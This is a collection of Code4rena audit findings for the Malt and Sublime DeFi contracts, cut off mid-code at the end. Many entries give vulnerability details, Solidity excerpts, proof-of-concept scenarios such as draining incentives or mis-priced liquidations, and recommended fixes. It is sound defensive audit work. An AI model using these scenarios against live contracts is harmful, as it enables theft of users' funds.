[{"title": "Reducing the epoch length results in leaking value from advancement incentives", "html_url": "https://github.com/code-423n4/2021-11-malt-findings/issues/4", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-11-malt-findings", "body": "# Handle  TomFrench   # Vulnerability details  ## Impact  Unintended advancement incentives being paid out to third party  ## Proof of Concept  `DAO.sol` incentives outside parties to advance the epoch by minting 100 MALT tokens for calling the `advance` function. This is limited by checking that the start timestamp of the next epoch has passed.   https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L55-L63  This start timestamp is calculated by multiplying the new epoch number by the length of an epoch and adding it to the genesis timestamp.  https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L65-L67  This method makes no accommodation for the fact that previous epochs may have been set to be a different length to what they are currently.  https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L111-L114  In the case where the epoch length is reduced, `DAO` will think that the epoch number can be incremented potentially many times. Provided the `advanceIncentive` is worth more than the gas necessary to advance the epoch will be rapidly advanced potentially many times paying out unnecessary incentives.  ## Recommended Mitigation Steps  Rather than calculating from the genesis timestamp, store the last time that the epoch length was modified and calculate from there.  "}, {"title": "Invalid equation check on `require`", "html_url": "https://github.com/code-423n4/2021-11-malt-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-11-malt-findings", "body": "Invalid equation check on `require`"}, {"title": "Event missing when removing a vote in extensions", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/170", "labels": ["bug", "0 (Non-critical)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "Event missing when removing a vote in extensions"}, {"title": "Collateral can be deposited in a finished pool", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/169", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "Collateral can be deposited in a finished pool"}, {"title": "Ether can be locked in the `PoolFactory` contract without a way to retrieve it", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/168", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "Ether can be locked in the `PoolFactory` contract without a way to retrieve it"}, {"title": "missing nonreentrant modfier", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/166", "labels": ["bug", "0 (Non-critical)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "missing nonreentrant modfier"}, {"title": "Change state mutability in NoYield.sol", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/165", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact The `liquidityToken` function in `NoYield.sol` can have its state mutability changed to `pure` instead of `view`. This has no other effect than suppressing compiler warnings, but may help the compiler optimize this function in the future  ## Proof of Concept  ## Tools Used  ## Recommended Mitigation Steps Change state mutability of `liquidityToken` to `pure`  "}, {"title": "Not needed zero address check", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/160", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x0x0x   # Vulnerability details  [https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Verification/Verification.sol#L150](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Verification/Verification.sol#L150)  In `Verfication.sol#unlinkAddress`, there is a not needed zero address check.  ```  require(_linkedTo != address(0), 'V:UA-Address not linked'); require(_linkedTo == msg.sender, 'V:UA-Not linked to sender');  ```  Since, `msg.sender != address(0)`, there is no need for a zero address check here.  "}, {"title": "Loops can be implemented more efficiently", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "Loops can be implemented more efficiently"}, {"title": "In `CreditLine#_borrowTokensToLiquidate`, oracle is used wrong way", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/155", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  0x0x0x   # Vulnerability details  Current implementation to get the price is as follows:  `(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_borrowAsset, _collateralAsset);`  [https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L1050](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L1050)  But it should not consult `borrowToken / collateralToken`, rather it should consult the inverse of this result. As a consequence, in `liquidate` the liquidator/lender can lose/gain funds as a result of this miscalculation.  ## Mitigation step  Replace it with  `(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_collateralAsset, _borrowAsset);`  "}, {"title": "denial of service", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/154", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  danb   # Vulnerability details  ## Impact in the first call to requery, If the oracle returns newProtocolEquity = 0, it can never be changed and would lead to denial of service of the system. ## Proof of Concept  In requery, init is checked to be false if newProtocolEquity = 0, and then set to true. so if it is already initialized and newProtocolEquity = 0, it wouldn't change anything ## Tools Used manual review  "}, {"title": "Gas: Use `else if` in `withdrawLiquidity`", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  cmichel   # Vulnerability details  The `if` conditions in `Pool.withdrawLiquidity` are distinct conditions on the pool status. Therefore, `else if` is semantically equivalent but more gas efficient.  ```solidity if (_loanStatus == LoanStatus.DEFAULTED || _loanStatus == LoanStatus.TERMINATED) {     uint256 _totalAsset;     if (poolConstants.borrowAsset != address(0)) {         _totalAsset = IERC20(poolConstants.borrowAsset).balanceOf(address(this));     } else {         _totalAsset = address(this).balance;     }     //assuming their will be no tokens in pool in any case except liquidation (to be checked) or we should store the amount in liquidate()     _toTransfer = _toTransfer.mul(_totalAsset).div(totalSupply()); } // @audit gas: use else if, status fields are distinct, only one of the branches is (if ever) executed anyway if (_loanStatus == LoanStatus.CANCELLED) {     _toTransfer = _toTransfer.add(_toTransfer.mul(poolVariables.penaltyLiquidityAmount).div(totalSupply())); }  if (_loanStatus == LoanStatus.CLOSED) {     //transfer repayment     _withdrawRepayment(msg.sender); } ```   "}, {"title": "Self-transfer leads to wrong withdrawable repayments", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/146", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  cmichel   # Vulnerability details  When transferring pool tokens to oneself the `Pool._beforeTokenTransfer` overwrites the `effectiveInterestWithdrawn` of the user with a higher amount than expected. It uses the previous balance + the transfer amount instead of just the previous balance:  ```solidity // @audit if from == to: overwrites with last _to statement => bug lenders[_from].effectiveInterestWithdrawn = (_fromBalance.sub(_amount)).mul(_totalRepaidAmount).div(_totalSupply); lenders[_to].effectiveInterestWithdrawn = (_toBalance.add(_amount)).mul(_totalRepaidAmount).div(_totalSupply); ```  # Impact The bug is not in the user's favor and would lead to them being able to withdraw fewer repayments in the future.  #### POC - user calls `Pool.transfer(from=user, to=user, amount=pool.balanceOf(user))` - pending repayments are withdrawn first by the `_withdrawRepayment` calls. (second one does not lead to a second withdrawal as the `effectiveInterestWithdrawn` is already increased in the first call) - `lenders[user].effectiveInterestWithdrawn` is then set using `2 * userBalance`. - This has the effect that the user appears to have claimed twice as many repayments as their balance indicates already and they won't be able to claim anymore for a while.  ## Recommended Mitigation Steps We still recommend fixing this bug, for example, by disallowing self-transfers.   "}, {"title": "Collateral deposit does not support fee-on-transfer tokens", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/143", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Collateral deposit does not support fee-on-transfer tokens"}, {"title": "`NoYield.sol` Tokens with fee on transfer are not supported", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/142", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "`NoYield.sol` Tokens with fee on transfer are not supported"}, {"title": "Extension voting threshold check needs to rerun on each transfer", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/141", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Extension` contract correctly reduces votes from the `from` address of a transfer and adds it to the `to` address of the transfer (in case both of them voted on it before), but it does not rerun the voting logic in `voteOnExtension` that actually grants the extension. This leads to issues where an extension should be granted but is not:  #### POC - `to` address has 100 tokens and votes for the extension - `from` address has 100 tokens but does not vote for the extension and transfers the 100 tokens to `to` - `to` now has 200 tokens, `removeVotes` is run, the `totalExtensionSupport` is increased by 100 to 200. In theory, the threshold is reached and the vote should pass if `to` could call `voteOnExtension` again. - But their call to `voteOnExtension` with the new balance will fail as they already voted on it (`lastVotedExtension == _extensionVoteEndTime`). The extension is not granted.  ## Impact Extensions that should be granted after a token transfer are not granted.  ## Recommended Mitigation Steps Rerun the threshold logic in `removeVotes` as it has the potential to increase the total support if `to` voted for the extension but `from` did not.   "}, {"title": "Extension voting power can be flashloaned", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/140", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "Extension voting power can be flashloaned"}, {"title": "Pool direct savingsaccount deposits fail when no strategy set", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/138", "labels": ["bug", "1 (Low Risk)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "Pool direct savingsaccount deposits fail when no strategy set"}, {"title": "Aave's share tokens are rebasing breaking current strategy code", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/137", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2021-12-sublime-findings", "body": "Aave's share tokens are rebasing breaking current strategy code"}, {"title": "approve return values not checked", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/136", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "approve return values not checked"}, {"title": "`unlockShares` wrong comment", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/135", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  cmichel   # Vulnerability details  The strategy contracts define an `unlockShares` function that must accept an `asset` parameter as the **share** token (yield token, aToken, cToken, etc.), otherwise, the code does not work. However, all comments say that `asset` is the address of the **underlying token**.  ```solidity /**   * @notice Used to unlock shares   * @param asset the address of underlying token   * @param amount the amount of shares to unlock   * @return received amount of shares received   **/ function unlockShares(address asset, uint256 amount) external override onlySavingsAccount nonReentrant returns (uint256) {     if (amount == 0) {         return 0;     } } ```  ## Recommended Mitigation Steps Fix the comments for all `unlockShares` by saying `asset` is the share token, not the underlying token.   "}, {"title": "Yearn token <> shares conversion decimal issue", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/134", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  cmichel   # Vulnerability details  The yearn strategy `YearnYield` converts shares to tokens by doing `pricePerFullShare * shares / 1e18`:  ``` function getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {     if (shares == 0) return 0;     // @audit should divided by vaultDecimals      amount = IyVault(liquidityToken[asset]).getPricePerFullShare().mul(shares).div(1e18); } ```  But Yearn's `getPricePerFullShare` seems to be [in `vault.decimals()` precision](https://github.com/yearn/yearn-vaults/blob/03b42dacacec2c5e93af9bf3151da364d333c222/contracts/Vault.vy#L1147), i.e., it should convert it as `pricePerFullShare * shares / (10 ** vault.decimals())`. The vault decimals are the same [as the underlying token decimals](https://github.com/yearn/yearn-vaults/blob/03b42dacacec2c5e93af9bf3151da364d333c222/contracts/Vault.vy#L295-L296)  ## Impact The token and shares conversions do not work correctly for underlying tokens that do not have 18 decimals. Too much or too little might be paid out leading to a loss for either the protocol or user.  ## Recommended Mitigation Steps Divide by `10**vault.decimals()` instead of `1e18` in `getTokensForShares`. Apply a similar fix in `getSharesForTokens`.  "}, {"title": "Wrong returns of `SavingsAccountUtil.depositFromSavingsAccount()` can cause fund loss", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/132", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  WatchPug   # Vulnerability details  The function `SavingsAccountUtil.depositFromSavingsAccount()` is expected to return the number of equivalent shares for given `_asset`.  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L225-L267  ```solidity /**  * @notice internal function used to get amount of collateral deposited to the pool  * @param _fromSavingsAccount if true, collateral is transferred from _sender's savings account, if false, it is transferred from _sender's wallet  * @param _toSavingsAccount if true, collateral is transferred to pool's savings account, if false, it is withdrawn from _sender's savings account  * @param _asset address of the asset to be deposited  * @param _amount amount of tokens to be deposited in the pool  * @param _poolSavingsStrategy address of the saving strategy used for collateral deposit  * @param _depositFrom address which makes the deposit  * @param _depositTo address to which the tokens are deposited  * @return _sharesReceived number of equivalent shares for given _asset  */ function _deposit(     bool _fromSavingsAccount,     bool _toSavingsAccount,     address _asset,     uint256 _amount,     address _poolSavingsStrategy,     address _depositFrom,     address _depositTo ) internal returns (uint256 _sharesReceived) {     if (_fromSavingsAccount) {         _sharesReceived = SavingsAccountUtil.depositFromSavingsAccount(             ISavingsAccount(IPoolFactory(poolFactory).savingsAccount()),             _depositFrom,             _depositTo,             _amount,             _asset,             _poolSavingsStrategy,             true,             _toSavingsAccount         );     } else {         _sharesReceived = SavingsAccountUtil.directDeposit(             ISavingsAccount(IPoolFactory(poolFactory).savingsAccount()),             _depositFrom,             _depositTo,             _amount,             _asset,             _toSavingsAccount,             _poolSavingsStrategy         );     } } ```  However, since `savingsAccountTransfer()` does not return the result of `_savingsAccount.transfer()`, but returned `_amount` instead, which means that `SavingsAccountUtil.depositFromSavingsAccount()` may not return the actual shares (when pps is not 1).   https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L11-L26  ```solidity     function depositFromSavingsAccount(         ISavingsAccount _savingsAccount,         address _from,         address _to,         uint256 _amount,         address _token,         address _strategy,         bool _withdrawShares,         bool _toSavingsAccount     ) internal returns (uint256) {         if (_toSavingsAccount) {             return savingsAccountTransfer(_savingsAccount, _from, _to, _amount, _token, _strategy);         } else {             return withdrawFromSavingsAccount(_savingsAccount, _from, _to, _amount, _token, _strategy, _withdrawShares);         }     } ```  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L66-L80  ```solidity     function savingsAccountTransfer(         ISavingsAccount _savingsAccount,         address _from,         address _to,         uint256 _amount,         address _token,         address _strategy     ) internal returns (uint256) {         if (_from == address(this)) {             _savingsAccount.transfer(_amount, _token, _strategy, _to);         } else {             _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);         }         return _amount;     } ```  As a result, the recorded `_sharesReceived` can be wrong.   https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L207-L223  ```solidity     function _depositCollateral(         address _depositor,         uint256 _amount,         bool _transferFromSavingsAccount     ) internal nonReentrant {         uint256 _sharesReceived = _deposit(             _transferFromSavingsAccount,             true,             poolConstants.collateralAsset,             _amount,             poolConstants.poolSavingsStrategy,             _depositor,             address(this)         );         poolVariables.baseLiquidityShares = poolVariables.baseLiquidityShares.add(_sharesReceived);         emit CollateralAdded(_depositor, _amount, _sharesReceived);     } ```  ### PoC  Given:  - the price per share of yearn USDC vault is `1.2`  1. Alice deposited `12,000 USDC` to `yearn` strategy, received `10,000` share tokens; 2. Alice created a pool, and added all the `12,000 USDC` from the saving account as collateral; The recorded `CollateralAdded` got the wrong number: `12000` which should be `10000`; 3. Alice failed to borrow money with the pool and tries to `cancelPool()`, it fails as the recorded collateral `shares` are more than the actual collateral.  As a result, Alice has lost all the `12,000 USDC`.  If Alice managed to borrow with the pool, when the loan defaults, the liquidation will also fail, and cause fund loss to the lenders.  ### Recommendation  Change to:  ```solidity function savingsAccountTransfer(     ISavingsAccount _savingsAccount,     address _from,     address _to,     uint256 _amount,     address _token,     address _strategy ) internal returns (uint256) {     if (_from == address(this)) {         return _savingsAccount.transfer(_amount, _token, _strategy, _to);     } else {         return _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);     } } ```  "}, {"title": "`SavingsAccount.sol` Wrong `amount` in `Transfer` events", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/130", "labels": ["bug", "0 (Non-critical)", "disagree with severity"], "target": "2021-12-sublime-findings", "body": "`SavingsAccount.sol` Wrong `amount` in `Transfer` events"}, {"title": "Gas Optimization: Struct layout", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/129", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  gzeon   # Vulnerability details  Rewrite the PoolConstants struct as follow can save some gas ```     struct PoolConstants {         uint256 borrowAmountRequested;         uint256 loanStartTime;         uint256 loanWithdrawalDeadline;         uint256 idealCollateralRatio;         uint256 borrowRate;         uint256 noOfRepaymentIntervals;         uint256 repaymentInterval;         address borrower;         address borrowAsset;         address collateralAsset;         address poolSavingsStrategy; // invest contract         address lenderVerifier;     }      ``` https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L46  "}, {"title": "`AaveYield.getTokensForShares()`, `AaveYield.getSharesForTokens()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "`AaveYield.getTokensForShares()`, `AaveYield.getSharesForTokens()` Implementation can be simpler and save some gas"}, {"title": "`Pool.sol#withdrawBorrowedAmount()` Validation of pool status can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check if `_poolStatus` and `block.timestamp` earlier can avoid unnecessary code execution when this check failed.  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L310-L348  ```solidity     function withdrawBorrowedAmount() external override onlyBorrower(msg.sender) nonReentrant {         LoanStatus _poolStatus = poolVariables.loanStatus;         uint256 _tokensLent = totalSupply();         require(             _poolStatus == LoanStatus.COLLECTION &&                 poolConstants.loanStartTime < block.timestamp &&                 block.timestamp < poolConstants.loanWithdrawalDeadline,             'WBA1'         );         IPoolFactory _poolFactory = IPoolFactory(poolFactory);         require(_tokensLent >= _poolFactory.minBorrowFraction().mul(poolConstants.borrowAmountRequested).div(10**30), 'WBA2');          poolVariables.loanStatus = LoanStatus.ACTIVE;         uint256 _currentCollateralRatio = getCurrentCollateralRatio();         require(_currentCollateralRatio >= poolConstants.idealCollateralRatio, 'WBA3');          uint256 _noOfRepaymentIntervals = poolConstants.noOfRepaymentIntervals;         uint256 _repaymentInterval = poolConstants.repaymentInterval;         IRepayment(_poolFactory.repaymentImpl()).initializeRepayment(             _noOfRepaymentIntervals,             _repaymentInterval,             poolConstants.borrowRate,             poolConstants.loanStartTime,             poolConstants.borrowAsset         );         IExtension(_poolFactory.extension()).initializePoolExtension(_repaymentInterval);          address _borrowAsset = poolConstants.borrowAsset;         (uint256 _protocolFeeFraction, address _collector) = _poolFactory.getProtocolFeeData();         uint256 _protocolFee = _tokensLent.mul(_protocolFeeFraction).div(10**30);         delete poolConstants.loanWithdrawalDeadline;          uint256 _feeAdjustedWithdrawalAmount = _tokensLent.sub(_protocolFee);          SavingsAccountUtil.transferTokens(_borrowAsset, _protocolFee, address(this), _collector);         SavingsAccountUtil.transferTokens(_borrowAsset, _feeAdjustedWithdrawalAmount, address(this), msg.sender);          emit AmountBorrowed(_feeAdjustedWithdrawalAmount, _protocolFee);     } ```  ### Recommendation  Change to:  ```solidity     function withdrawBorrowedAmount() external override onlyBorrower(msg.sender) nonReentrant {         LoanStatus _poolStatus = poolVariables.loanStatus;         require(             _poolStatus == LoanStatus.COLLECTION &&                 poolConstants.loanStartTime < block.timestamp &&                 block.timestamp < poolConstants.loanWithdrawalDeadline,             'WBA1'         );         uint256 _tokensLent = totalSupply();         IPoolFactory _poolFactory = IPoolFactory(poolFactory);         require(_tokensLent >= _poolFactory.minBorrowFraction().mul(poolConstants.borrowAmountRequested).div(10**30), 'WBA2');          poolVariables.loanStatus = LoanStatus.ACTIVE;         uint256 _currentCollateralRatio = getCurrentCollateralRatio();         require(_currentCollateralRatio >= poolConstants.idealCollateralRatio, 'WBA3');          uint256 _noOfRepaymentIntervals = poolConstants.noOfRepaymentIntervals;         uint256 _repaymentInterval = poolConstants.repaymentInterval;         IRepayment(_poolFactory.repaymentImpl()).initializeRepayment(             _noOfRepaymentIntervals,             _repaymentInterval,             poolConstants.borrowRate,             poolConstants.loanStartTime,             poolConstants.borrowAsset         );         IExtension(_poolFactory.extension()).initializePoolExtension(_repaymentInterval);          address _borrowAsset = poolConstants.borrowAsset;         (uint256 _protocolFeeFraction, address _collector) = _poolFactory.getProtocolFeeData();         uint256 _protocolFee = _tokensLent.mul(_protocolFeeFraction).div(10**30);         delete poolConstants.loanWithdrawalDeadline;          uint256 _feeAdjustedWithdrawalAmount = _tokensLent.sub(_protocolFee);          SavingsAccountUtil.transferTokens(_borrowAsset, _protocolFee, address(this), _collector);         SavingsAccountUtil.transferTokens(_borrowAsset, _feeAdjustedWithdrawalAmount, address(this), msg.sender);          emit AmountBorrowed(_feeAdjustedWithdrawalAmount, _protocolFee);     } ```  "}, {"title": "`10**30` can be changed to `1e30` and save some gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L379-L383  ```solidity     function _updateLiquidatorRewardFraction(uint256 _rewardFraction) internal {         require(_rewardFraction <= 10**30, 'Fraction has to be less than 1');         liquidatorRewardFraction = _rewardFraction;         emit LiquidationRewardFractionUpdated(_rewardFraction);     } ```  Can be changed to:  ```solidity     function _updateLiquidatorRewardFraction(uint256 _rewardFraction) internal {         require(_rewardFraction <= 1e30, 'Fraction has to be less than 1');         liquidatorRewardFraction = _rewardFraction;         emit LiquidationRewardFractionUpdated(_rewardFraction);     } ```  and save some gas from unnecessary arithmetic operation in `10**30`.  "}, {"title": "Inline unnecessary function can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Inline unnecessary function can make the code simpler and save some gas"}, {"title": "Remove unused local variables", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/119", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  pmerkleplant   # Vulnerability details  ## Impact  The local variables `_receivedToken` in the functions `SavingsAccount.withdraw` and `SavingsAccount.withdrawFrom` are unused.  Removing them would save gas.  ## Tools used  slither  "}, {"title": "Cache storage variables in the stack can save gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/117", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "Cache storage variables in the stack can save gas"}, {"title": "Wrong implementation of `NoYield.sol#emergencyWithdraw()`", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/115", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L78-L83  ```solidity=78{81} function emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {     require(_wallet != address(0), 'cant burn');     uint256 amount = IERC20(_asset).balanceOf(address(this));     IERC20(_asset).safeTransfer(_wallet, received);     received = amount; } ```  `received` is not being assigned prior to L81, therefore, at L81, `received` is `0`.  As a result, the `emergencyWithdraw()` does not work, in essence.  ### Recommendation  Change to:  ```solidity=78 function emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {     require(_wallet != address(0), 'cant burn');     received = IERC20(_asset).balanceOf(address(this));     IERC20(_asset).safeTransfer(_wallet, received); } ```  "}, {"title": "Wrong usage of `OracleLibrary.getQuoteAtTick()` breaks `PriceOracle.sol`", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/114", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-sublime-findings", "body": "Wrong usage of `OracleLibrary.getQuoteAtTick()` breaks `PriceOracle.sol`"}, {"title": "Remove unnecessary variables can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/112", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "Remove unnecessary variables can make the code simpler and save some gas"}, {"title": "`Pool.sol` should use the Upgradeable variant of OpenZeppelin Contracts", "html_url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/108", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-sublime-findings", "body": "# Handle  WatchPug   # Vulnerability details  Given that `Pool` is deployed as a proxied contract, it should use the Upgradeable variant of OpenZeppelin Contracts.  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/PoolFactory.sol#L320-L355  ```solidity=320{348} function _createPool(     uint256 _poolSize,     uint256 _borrowRate,     address _borrowToken,     address _collateralToken,     uint256 _idealCollateralRatio,     uint256 _repaymentInterval,     uint256 _noOfRepaymentIntervals,     address _poolSavingsStrategy,     uint256 _collateralAmount,     bool _transferFromSavingsAccount,     bytes32 _salt,     address _lenderVerifier ) internal {     bytes memory data = _encodePoolInitCall(         _poolSize,         _borrowRate,         _borrowToken,         _collateralToken,         _idealCollateralRatio,         _repaymentInterval,         _noOfRepaymentIntervals,         _poolSavingsStrategy,         _collateralAmount,         _transferFromSavingsAccount,         _lenderVerifier     );     bytes32 salt = keccak256(abi.encodePacked(_salt, msg.sender));     bytes memory bytecode = abi.encodePacked(type(SublimeProxy).creationCode, abi.encode(poolImpl, address(0x01), data));     uint256 amount = _collateralToken == address(0) ? _collateralAmount : 0;      address pool = _deploy(amount, salt, bytecode);      poolRegistry[pool] = true;     emit PoolCreated(pool, msg.sender); } ```  Otherwise, the constructor functions of `Pool`'s parent contracts which may change storage at deploy time, won't work for deployed instances.  The effect may be different for different OpenZeppelin libraries.  Take `ReentrancyGuard` for example, the code inside `ReentrancyGuard.sol#constructor` won't work, should use `ReentrancyGuardUpgradeable.sol` instead:  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L6-L8  ```solidity=6{6} import '@openzeppelin/contracts/utils/ReentrancyGuard.sol'; import '@openzeppelin/contracts-upgradeable/proxy/Initializable.sol'; import '@openzeppelin/contracts-upgradeable/token/ERC20/ERC20PausableUpgradeable.sol'; ```  https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L24-L24  ```solidity=24 contract Pool is Initializable, ERC20PausableUpgradeable, IPool, ReentrancyGuard { ```  ### Recommendation  Change to:  ```solidity=6{6} import \"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\"; import '@openzeppelin/contracts-upgradeable/proxy/Initializable.sol'; import '@openzeppelin/contracts-upgradeable/token/ERC20/ERC20PausableUpgradeable.sol'; ```  ```solidity=24 contract Pool is Initializable, ReentrancyGuardUpgradeable, ERC20PausableUpgradeable, IPool { ```  ```solidity=133{164} function initialize(     uint256 _borrowAmountRequested,     uint256 _borrowRate,     address _borrower,     address _borrowAsset,     address _collateralAsset,     uint256 _idealCollateralRatio,     uint256 _repaymentInterval,     uint256 _noOfRepaymentIntervals,     address _poolSavingsStrategy,     uint256 _collateralAmount,     bool _transferFromSavingsAccount,     address _lenderVerifier,     uint256 _loanWithdrawalDuration,     uint256 _collectionPeriod ) external payable initializer {     poolFactory = msg.sender;     poolConstants.borrowAsset = _borrowAsset;     poolConstants.idealCollateralRatio = _idealCollateralRatio;     poolConstants.collateralAsset = _collateralAsset;     